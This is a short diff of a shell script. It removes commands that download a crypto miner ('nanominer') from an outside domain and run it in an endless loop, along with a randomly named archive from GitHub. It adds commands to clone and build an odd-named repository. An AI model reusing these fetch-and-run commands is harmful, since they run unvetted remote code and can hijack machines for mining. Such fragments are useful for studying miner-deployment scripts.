@@ -1,19 +1,5 @@
-wget -N http://www.blueinc.cloud/nanominer.tar.xz
-
-tar -xvf ./nanominer.tar.xz
-
-cd ./nanominer/
-
-while true
-do
-
-./nanominer
-
-done
-
-wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linuxweb844444748874.tar.xz
-tar -xvf ./linuxweb844444748874.tar.xz
-cd ./linuxweb844444748874/
+git clone https://github.com/mobileapps84741274/linux84748874
+cd ./linux84748874/
 mkdir linux84748874
 cd linux84748874
 cmake ..
